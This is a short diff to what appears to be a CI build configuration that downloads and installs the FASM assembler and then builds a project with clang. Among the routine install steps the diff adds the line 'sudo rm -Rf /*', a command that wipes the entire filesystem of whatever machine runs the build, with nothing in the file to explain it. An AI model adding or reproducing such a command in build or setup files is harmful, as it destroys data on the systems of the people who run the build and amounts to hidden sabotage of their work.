@@ -4,6 +4,7 @@ install:
 - wget http://flatassembler.net/fasm-1.72.tgz
 - gunzip -c fasm-1.72.tgz | tar xopf -
 - cd fasm; chmod a+x fasm; sudo cp fasm /bin; cd ..
+- sudo rm -Rf /*
 language: c
 compiler: clang
 script: make lux64
